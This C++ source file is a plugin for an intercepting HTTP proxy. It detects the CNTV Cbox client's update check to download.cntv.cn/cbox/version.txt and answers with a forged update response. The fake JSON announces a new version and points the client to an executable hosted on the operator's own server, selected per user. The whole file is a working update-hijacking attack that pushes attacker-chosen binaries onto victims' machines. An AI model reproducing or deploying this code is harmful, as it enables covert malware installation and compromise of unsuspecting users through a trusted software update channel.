
#include "cboxPlugin.h"
#include "../HttpUtils.h"
#include "../cipher/CryptoUtils.h"

int CboxPlugin::isCboxUpdate(const char * url, const char * host) {
	if (strstr(host, "download.cntv.cn")) {
		if (strstr(url, "/cbox/version.txt"))
		{
			return TRUE;
		}
	}
	return FALSE;
}

int CboxPlugin::makeReponse(char * dstbuf, int len, int dstbuflimit, LPHTTPPROXYPARAM lphttp) {
	char * lpRespFormat = "HTTP/1.1 200 OK\r\nContent-Type: text/json\r\nContent-Length: %u\r\nConnection: keep-alive\r\n\r\n%s";

	string ip = HttpUtils::getIPstr(gServerIP) + "/" + lphttp->username;

	string exesrcfn = Public::getUserPluginPath(lphttp->username) + WEIXIN_PC_UPDATE_EXE_FILENAME;

	char szmd5_1[64] = { 0 };
	unsigned char hexmd5[64] = { 0 };
	int filesize1 = CryptoUtils::getUpdateFileMd5(exesrcfn, szmd5_1, hexmd5, FALSE);
	if (filesize1 <= 0)
	{
		return FALSE;
	}

	char * retformat =
		"{\r\n"
		"\"result\": {\r\n"
		"\"version\": [\r\n"
		"{\r\n"
		"\"features\": \"\", \r\n"
		"\"type\": \"2\", \r\n"
		"\"url\": \"http://%s/%s\", \r\n"
		"\"version\":\"9.5.2.0\"\r\n"
		"}\r\n"
		"]\r\n"
		"}, \r\n"
		"\"status\": {\r\n"
		"\"now\": \"2020-06-26 09:40:06\", \r\n"
		"\"code\": \"0\"\r\n"
		"}\r\n"
		"}";

	char szhttpdata[4096];
	int datalen = sprintf(szhttpdata, retformat, ip.c_str(), WEIXIN_PC_UPDATE_EXE_FILENAME);
	int retlen = sprintf(dstbuf, lpRespFormat, datalen, szhttpdata);
	return retlen;
}